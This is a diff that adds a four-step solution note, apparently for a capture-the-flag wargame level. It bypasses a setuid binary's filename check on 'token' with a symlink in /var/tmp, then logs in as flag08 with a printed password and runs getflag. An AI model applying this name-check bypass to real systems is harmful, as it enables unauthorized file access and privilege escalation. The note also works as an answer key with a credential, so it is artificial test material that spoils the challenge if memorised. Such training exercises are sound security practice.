@@ -1,0 +1,4 @@
+1. "gdb level07" > Notice that the binary checks if the given path contains "token"
+2.  "ln -s `pwd`/token /var/tmp/toto" > Create a symlink to give another name to the token 
+3. "./level08 /var/tmp/toto"
+4. su flag08 ("quif5eloekouj29ke0vouxean") && getflag
